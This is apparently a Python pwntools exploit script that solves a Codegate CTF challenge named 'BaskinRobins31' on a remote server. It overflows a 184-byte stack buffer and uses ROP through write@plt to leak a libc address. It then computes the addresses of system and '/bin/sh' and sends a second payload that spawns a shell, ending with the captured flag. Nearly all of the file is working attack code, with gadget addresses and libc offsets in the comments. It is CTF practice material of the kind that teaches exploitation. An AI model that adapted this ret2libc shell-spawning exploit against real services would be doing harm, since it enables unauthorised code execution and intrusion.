from pwn import *
from struct import *
#https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
#NX is on
#64-bit bin
#going to require us to ROP!
#there is 184 bytes between our input_buf and our saved EIP. 
#p 0x7fffffffe458 - 0x7fffffffe3a0 = 184
#the helper function allows us to leak _i think_


#so what we want to do is leak memsets libc address from the GOT, then return into the PLT with the address of write. 
#memset:
#0000000000602038 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5

# r = process('./BaskinRobins31')
r = remote('ch41l3ng3s.codegate.kr', 3131)
# gdb.attach(r,'b *0x40097a')
# gdb.attach(r,'b *0x40087d')
#our gadget addresses! 
#helper = 0x400876
helper = 0x40087a
write_plt = 0x4006d0
memset_got = 0x602038  
memset_plt = 0x4006f0
strtoul_got = 0x602068
libc_start_main_got = 0x602048
read_plt = 0x400700
write_yay = 0x0602078 #.data section?
#write_yay = 0x601000
# write_yay = 0x00601e20 #.jcr

##### Leak memeset libc with write@plt #####
buf = ""
buf += "A"*184#padding until EIP.
buf += p64(helper) #stdout flag for write
buf += p64(0x1) #our argument setup
buf += p64(0x602018) #address to read from PUTCHAR
buf += p64(0x8) #number of bytes to write to stdout
buf += p64(write_plt) #return back into write@plt
buf += p64(0x4008a4) #goback.
# buf += p64(helper) #stdout flag for write
# buf += p64(0x1) #our argument setup
# buf += p64(strtoul_got) #address to read from
# buf += p64(0x8) #number of bytes to write to stdout
# buf += p64(write_plt) #return back into write@plt

### s1 - overwrite memset GOT with read@plt #####
# buf += p64(helper)
# buf += p64(0x0)
# buf += p64(memset_got)
# buf += p64(0x8) 
# buf += p64(read_plt) #ret to read@plt

# ##### s2 - read /bin/sh into _somewhere_ writeable using read@plt #####
# buf += p64(helper)
# buf += p64(0x0)
# buf += p64(write_yay)
# buf += p64(0x8)
# buf += p64(read_plt)

# ##### s3 - set RDI = /bin/sh and call our winwinwin #####
# buf += p64(helper)
# buf += p64(write_yay)
# buf += p64(0x0)
# buf += p64(0x0)
# buf += p64(memset_plt) #should be system!

print(r.recvuntil('(1-3)'))
r.sendline(buf) #leak our memeset addr from libc
print(r.recvuntil(':('))
libc_start_main_got_a = r.recvn(8)[-6:].ljust(8, '\x00')
libc_start_main_got_b = u64(libc_start_main_got_a)
libc_start_main_got_c = hex(libc_start_main_got_b) #this is our final memset address. 
print("libc_start_main_got is @ " + libc_start_main_got_c)
# strtoul_a = r.recvn(8)[-6:].ljust(8, '\x00')
# strtoul_b = u64(strtoul_a)
# strtoul_c = hex(strtoul_b) #this is our final memset address. 
# print("strtoul_c is @ " + strtoul_c)
#libc_start_main_offset = 0x020740
#system_offset = 0x045390

libc_base = libc_start_main_got_b - 0x071290
system_address = libc_base + 0x45390
sh_address = libc_base + 0x18cd57 # ubuntu 10

print("libc_base is @ " + hex(libc_base))
print("system is @ " + hex(system_address))
print("binsh is @ " + hex(sh_address))
# print("strtoul is @ " + strtoul_got)

#### Now craft a fake stackframe and win. ####
bufx = ""
bufx += "A" * 184 #padding until EIP.
bufx += p64(helper)
bufx += p64(sh_address)
bufx += p64(0x0)
bufx += p64(0x0)
bufx += p64(system_address)

r.sendline(bufx)

#send addr of system. 
# print("providing system :D")
# # r.send(p64(system_address))

# #send our /bin/sh 
# print("providing /bin/sh")
# r.send("/bin/sh\x00")
# r.send(p64(sh_address))




#We now have our leak, lets calculate some offsets!
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep memset
#    67: 00000000000ac8b0   114 FUNC    WEAK   DEFAULT   13 wmemset@@GLIBC_2.2.5
#   779: 0000000000117c30    25 FUNC    GLOBAL DEFAULT   13 __wmemset_chk@@GLIBC_2.4
#   846: 000000000008f1b0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5 <-- this one
#  1397: 0000000000116370    65 IFUNC   GLOBAL DEFAULT   13 __memset_chk@@GLIBC_2.3.4

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
#   225: 0000000000138810    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
#   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
#  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

#subtracting the memset offset from our address _should_ give us the libc base address. 
# memset_offset = 0x08f1b0
# system_offset = 0x045390
# libc_base = memset_b - memset_offset
# system_address = libc_base + system_offset - 0x90 
# print("libc_base is @ " + hex(libc_base))
# print("system is @ " + hex(system_address))
# print(r.recvall())
#pray!
r.interactive()

#flag{The Korean name of "Puss in boots" is "My mom is an alien"}

